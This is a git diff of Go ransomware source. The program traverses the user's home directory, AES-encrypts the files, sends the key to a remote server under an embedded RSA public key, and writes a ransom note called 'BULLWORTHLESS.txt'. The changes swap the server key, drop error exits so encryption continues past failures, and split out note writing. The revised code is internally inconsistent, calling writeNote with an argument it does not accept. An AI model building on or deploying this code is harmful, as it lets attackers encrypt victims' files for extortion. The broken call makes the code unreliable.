@@ -21,12 +21,12 @@ var key []byte
 var fileSep string
 var serverPub = []byte(`
 -----BEGIN PUBLIC KEY-----
-MIIBCgKCAQEAzGLShgBYK22Q7L69uu/X9jcoilK2gWloRzpea4boVG+KSKN6KVW9
-ZF379B9tkwOEwi3e6fDWEBaykMjgnz6P9agewQnBI7vHu/5mOIlYigwp833hG8wO
-dPjd279EnEf8W2GaQbj3sq4pb/TOpuv7mIgtyNUHIqDz1nrZ6JiY9J98A/7lma9L
-Zg6clTJZgPKHRxK0QkzUogGnYJWxt/v9wb+sSkWc6O4tOitnsnC+RfcS9xrOAU5r
-7qEGpknlVRBqoyDjVbWuSvOgRz1azmkpe4ZgCylTfEB3e1HBKiNq2SJZBFx7ssAG
-wcWSZIdi/fsr1khfNoQU429EYmknW5JjFQIDAQAB
+MIIBCgKCAQEAxPurUv662UU6qWZokwN/Obn4Pv7FOhrqxgdNEbCHGfItxt3xkYgT
+uDtPMukMZteli2SxkboA2MpepNlNJ3sSRdK830je/W2KtKWwr3woT6Xe32jXztDI
+1Q6jtOvXO0xW0liEUWLvQCLQrflLPhNwvv1fDM2JEcrXWSaPoS9EhAiEtPUtR8xx
+BAR8+kXs4dNalybDz893unEI/YmnNS2WXwDnj14u9IRLD0XtbuP/aR8sFxzLTQdG
+g0CFP4RcdYzvo/VA65HFQRzsP8E5bmv5khFm8COl6zkzgxZC4ZR7kB5DHHCs1eaa
+XJLa5mSakYA2CcoILzZAoFC0V4tD15KP8QIDAQAB
 -----END PUBLIC KEY-----`)
 
 func main() {
@@ -49,8 +49,13 @@ func main() {
 		fmt.Println(err)
 		os.Exit(1)
 	}
-	sendKey(hexKey)
+	shasum, err := sendKey(hexKey)
+	if err != nil {
+		fmt.Println(err)
+		os.Exit(1)
+	}
 	traverseFiles(home)
+	writeNote(shasum)
 }
 
 func genKey() error {
@@ -92,7 +97,6 @@ func traverseFiles(path string) {
 	files, err := os.ReadDir(path)
 	if err != nil {
 		fmt.Println(err)
-		os.Exit(1)
 	}
 
 	for _, file := range files {
@@ -116,7 +120,6 @@ func encryptFile(path string) {
 	data, err := os.ReadFile(path)
 	if err != nil {
 		fmt.Println(err)
-		os.Exit(1)
 	}
 
 	c, err := aes.NewCipher(key)
@@ -145,12 +148,7 @@ func encryptFile(path string) {
 	}
 }
 
-func sendKey(hexKey string) error {
-	hostname, err := os.Hostname()
-	if err != nil  {
-		fmt.Println(err)
-		return err
-	}
+func sendKey(hexKey string) (string, error) {
 
 	sum := sha256.Sum256([]byte(hexKey))
 	shaSum := fmt.Sprintf("%x", sum)
@@ -158,13 +156,15 @@ func sendKey(hexKey string) error {
 	if err != nil || resp.StatusCode != 200 {
 		fmt.Println(err)
 		fmt.Println("HTTP Response: ", resp.StatusCode)
-		return err
+		return "", err
 	}
+	return shaSum, nil
+}
 
-	n, err := os.Create("note.txt")
+func writeNote() {
+	n, err := os.Create("BULLWORTHLESS.txt")
 	if err != nil {
 		fmt.Println(err)
-		return err
 	}
 	defer n.Close()
 	home, _ := os.UserHomeDir()
@@ -172,8 +172,6 @@ func sendKey(hexKey string) error {
 	_, err = n.WriteString(s)
 	if err != nil {
 		fmt.Println("Error writing file: ", err)
-		return err
 	}
-	return nil
 }
 
